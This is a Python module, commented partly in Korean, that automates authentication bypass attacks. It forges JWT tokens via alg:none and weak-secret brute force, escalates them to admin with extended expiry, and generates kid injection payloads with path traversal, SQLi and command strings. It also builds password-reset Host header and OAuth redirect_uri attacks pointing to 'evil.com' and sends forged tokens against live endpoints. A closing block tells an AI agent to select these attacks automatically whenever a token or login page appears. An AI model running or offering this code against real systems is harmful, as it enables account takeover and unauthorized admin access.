"""
Auth Bypass Automator — JWT/OAuth/세션/비밀번호 재설정 우회 자동화
==================================================================
1. JWT: alg:none, alg confusion, weak secret bruteforce, kid injection
2. 세션: 세션 고정, 세션 예측, 세션 토큰 재사용
3. 비밀번호 재설정: 토큰 예측, Host 헤더 인젝션, 응답 조작
4. OAuth: redirect_uri 조작, state CSRF, implicit flow 취약점
5. 한국 특화: /member/login.php bypass, captcha bypass
"""
from __future__ import annotations

import base64
import hmac
import hashlib
import json
import re
import time
from dataclasses import dataclass, field
from typing import Callable


# ══════════════════════════════════════════════════════════════
# JWT 취약점 탐지
# ══════════════════════════════════════════════════════════════

COMMON_JWT_SECRETS = [
    "secret", "secret123", "password", "admin", "test", "key",
    "your-256-bit-secret", "your-secret-key", "jwt-secret",
    "HS256", "changeme", "1234567890", "qwerty", "abc123",
    "super-secret", "mysecretkey", "secretkey", "private-key",
]

JWT_KID_PAYLOADS = [
    "/../../../dev/null",
    "/dev/null",
    "../../etc/passwd",
    "' OR '1'='1",
    "| id",
]


def _b64_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


@dataclass
class JwtAnalysis:
    original_token: str
    header: dict
    payload: dict
    algorithm: str
    none_bypass_token: str = ""
    weak_secret: str = ""
    forged_admin_token: str = ""
    kid_injectable: bool = False
    findings: list[str] = field(default_factory=list)


def analyze_jwt(token: str) -> JwtAnalysis:
    """JWT 토큰 분석 + 자동 취약점 탐지"""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    header = json.loads(_b64_decode(parts[0]))
    payload = json.loads(_b64_decode(parts[1]))
    alg = header.get("alg", "HS256")

    result = JwtAnalysis(
        original_token=token,
        header=header,
        payload=payload,
        algorithm=alg,
    )

    # ── alg:none 우회 ───────────────────────────────────────
    none_header = {**header, "alg": "none"}
    none_token_unsigned = (
        _b64_encode(json.dumps(none_header, separators=(",", ":")).encode())
        + "."
        + parts[1]
        + "."
    )
    result.none_bypass_token = none_token_unsigned
    result.findings.append(f"alg:none bypass token generated")

    # ── 관리자 권한 페이로드 수정 ───────────────────────────
    admin_payload = dict(payload)
    for k in ("role", "roles", "is_admin", "admin", "is_superuser", "type", "group"):
        if k in admin_payload:
            if isinstance(admin_payload[k], bool):
                admin_payload[k] = True
            elif isinstance(admin_payload[k], str):
                admin_payload[k] = "admin"
            elif isinstance(admin_payload[k], list):
                admin_payload[k].append("admin")
    # exp 연장
    if "exp" in admin_payload:
        admin_payload["exp"] = int(time.time()) + 86400 * 365

    # ── Weak secret 브루트포스 ──────────────────────────────
    if alg in ("HS256", "HS384", "HS512"):
        for secret in COMMON_JWT_SECRETS:
            hash_fn = {
                "HS256": hashlib.sha256,
                "HS384": hashlib.sha384,
                "HS512": hashlib.sha512,
            }.get(alg, hashlib.sha256)
            sig_input = f"{parts[0]}.{parts[1]}".encode()
            expected_sig = _b64_encode(
                hmac.new(secret.encode(), sig_input, hash_fn).digest()
            )
            if expected_sig == parts[2]:
                result.weak_secret = secret
                # 관리자 토큰 forge
                new_header_enc = _b64_encode(
                    json.dumps(header, separators=(",", ":")).encode()
                )
                new_payload_enc = _b64_encode(
                    json.dumps(admin_payload, separators=(",", ":")).encode()
                )
                new_sig_input = f"{new_header_enc}.{new_payload_enc}".encode()
                new_sig = _b64_encode(
                    hmac.new(secret.encode(), new_sig_input, hash_fn).digest()
                )
                result.forged_admin_token = f"{new_header_enc}.{new_payload_enc}.{new_sig}"
                result.findings.append(f"WEAK SECRET FOUND: '{secret}'")
                break

    # ── kid 인젝션 가능 여부 ────────────────────────────────
    if "kid" in header:
        result.kid_injectable = True
        result.findings.append(f"kid parameter present: '{header['kid']}' → path traversal/SQLi possible")

    return result


# ══════════════════════════════════════════════════════════════
# 비밀번호 재설정 취약점
# ══════════════════════════════════════════════════════════════

@dataclass
class PasswordResetFinding:
    method: str
    payload: str
    expected_result: str
    severity: str = "HIGH"


def gen_password_reset_payloads(
    email: str,
    target_domain: str,
    attacker_domain: str = "evil.com",
) -> list[PasswordResetFinding]:
    """비밀번호 재설정 취약 페이로드 목록"""
    return [
        PasswordResetFinding(
            method="Host_Header_Injection",
            payload=f"Host: {attacker_domain}",
            expected_result="Reset link points to attacker domain",
        ),
        PasswordResetFinding(
            method="X-Forwarded-Host",
            payload=f"X-Forwarded-Host: {attacker_domain}",
            expected_result="Reset link uses X-Forwarded-Host",
        ),
        PasswordResetFinding(
            method="Email_Case_Variation",
            payload=email.upper(),
            expected_result="Same reset token reused (account collision)",
        ),
        PasswordResetFinding(
            method="Email_Plus_Variation",
            payload=f"{email.split('@')[0]}+test@{email.split('@')[1]}",
            expected_result="Reset sent to original account (email+ ignored)",
        ),
        PasswordResetFinding(
            method="Response_Manipulation",
            payload='{"success": true, "message": "Password reset email sent"}',
            expected_result="Change 'false' to 'true' in response → bypass",
        ),
        PasswordResetFinding(
            method="Token_Reuse",
            payload="Use same reset token twice",
            expected_result="Token not invalidated after first use",
        ),
    ]


# ══════════════════════════════════════════════════════════════
# OAuth 취약점 탐지
# ══════════════════════════════════════════════════════════════

@dataclass
class OAuthFinding:
    vuln_type: str
    test_url: str
    description: str
    severity: str = "HIGH"


def gen_oauth_test_cases(
    auth_endpoint: str,
    client_id: str,
    redirect_uri: str,
    scope: str = "openid profile email",
) -> list[OAuthFinding]:
    """OAuth 취약 테스트 케이스 생성"""
    findings: list[OAuthFinding] = []
    base = auth_endpoint.split("?")[0]

    # redirect_uri 조작
    evil_redirects = [
        "https://evil.com/callback",
        redirect_uri + ".evil.com",
        redirect_uri.replace("https://", "https://evil.com@"),
        "/".join(redirect_uri.split("/")[:-1]) + "/evil",
    ]
    for evil_uri in evil_redirects:
        findings.append(OAuthFinding(
            vuln_type="redirect_uri_manipulation",
            test_url=f"{base}?response_type=code&client_id={client_id}&redirect_uri={evil_uri}&scope={scope}",
            description=f"Test if redirect_uri validation allows: {evil_uri}",
        ))

    # state CSRF
    findings.append(OAuthFinding(
        vuln_type="state_csrf",
        test_url=f"{base}?response_type=code&client_id={client_id}&redirect_uri={redirect_uri}&scope={scope}&state=CSRF_TEST",
        description="state parameter not validated → CSRF on OAuth flow",
    ))

    # open redirect chain
    findings.append(OAuthFinding(
        vuln_type="open_redirect_chain",
        test_url=f"{base}?response_type=code&client_id={client_id}&redirect_uri={redirect_uri}&scope={scope}&next=https://evil.com",
        description="next/return parameter can chain open redirect",
    ))

    return findings


# ══════════════════════════════════════════════════════════════
# 세션 취약점 탐지
# ══════════════════════════════════════════════════════════════

SESSION_WEAK_PATTERNS = [
    (r"^[a-f0-9]{32}$", "MD5 hash (predictable)"),
    (r"^\d+$", "Numeric sequence (enumerable)"),
    (r"^[a-zA-Z0-9]{8,16}$", "Short alphanumeric (brute-forceable)"),
    (r"^[a-f0-9]{40}$", "SHA1 hash (predictable if seed known)"),
]


def analyze_session_token(token: str) -> dict:
    """세션 토큰 취약성 분석"""
    result = {"token": token, "length": len(token), "issues": []}

    for pattern, desc in SESSION_WEAK_PATTERNS:
        if re.match(pattern, token):
            result["issues"].append(desc)

    if len(token) < 16:
        result["issues"].append("Too short (< 16 chars)")
    if len(set(token)) < 10:
        result["issues"].append("Low entropy (few unique chars)")

    # base64 디코드 시도
    try:
        decoded = base64.b64decode(token + "==").decode("utf-8", errors="ignore")
        if re.search(r'(?:user|id|name|role|admin)', decoded, re.I):
            result["issues"].append(f"Base64 contains sensitive data: {decoded[:50]}")
    except Exception:
        pass

    return result


# ══════════════════════════════════════════════════════════════
# 통합 Auth Bypass 클래스
# ══════════════════════════════════════════════════════════════

class AuthBypassEngine:
    """인증 우회 자동화 통합 엔진"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, dict | None], tuple[int, str]],
        target_base: str,
        log_fn: Callable[[str], None] | None = None,
    ):
        self._req = request_fn
        self.base = target_base.rstrip("/")
        self.log = log_fn or (lambda s: None)

    def test_jwt(self, token: str, auth_endpoint: str) -> JwtAnalysis:
        """JWT 취약점 자동 테스트"""
        analysis = analyze_jwt(token)

        # alg:none 실제 테스트
        status, body = self._req(
            auth_endpoint, "GET",
            {"Authorization": f"Bearer {analysis.none_bypass_token}"}, None
        )
        if status == 200:
            analysis.findings.append(f"[CONFIRMED] alg:none bypass works! HTTP {status}")
            self.log(f"[AUTH!] JWT alg:none bypass: {auth_endpoint}")

        # 위조 토큰 테스트 (weak secret인 경우)
        if analysis.forged_admin_token:
            status2, body2 = self._req(
                auth_endpoint, "GET",
                {"Authorization": f"Bearer {analysis.forged_admin_token}"}, None
            )
            if status2 == 200:
                analysis.findings.append(f"[CONFIRMED] Forged admin token works!")
                self.log(f"[AUTH!] JWT admin forge: {auth_endpoint}")

        return analysis

    def test_admin_direct_access(self, admin_paths: list[str]) -> list[tuple[str, int]]:
        """관리자 경로 직접 접근 시도 (인증 없이)"""
        accessible: list[tuple[str, int]] = []
        for path in admin_paths:
            url = path if path.startswith("http") else self.base + path
            status, body = self._req(url, "GET", {}, None)
            if status in (200, 201, 301, 302) and len(body) > 50:
                accessible.append((url, status))
                self.log(f"[AUTH!] 미인증 관리자 접근: {url} → {status}")
        return accessible

    def test_password_reset(self, reset_endpoint: str, target_email: str) -> list[PasswordResetFinding]:
        """비밀번호 재설정 취약점 테스트"""
        payloads = gen_password_reset_payloads(target_email, self.base)
        self.log(f"[AUTH] 비밀번호 재설정 테스트: {reset_endpoint}")
        return payloads


AUTH_BYPASS_SUMMARY = """
=== AUTH BYPASS ENGINE (AI AUTO-SELECT) ===

Trigger: any JWT token present, OAuth flow visible, /login or /reset endpoint found

JWT test:   AuthBypassEngine.test_jwt(token, auth_endpoint)
Admin:      AuthBypassEngine.test_admin_direct_access(admin_paths)
PwReset:    gen_password_reset_payloads(email, domain, attacker_domain)
OAuth:      gen_oauth_test_cases(auth_ep, client_id, redirect_uri)
Session:    analyze_session_token(cookie_value)
"""
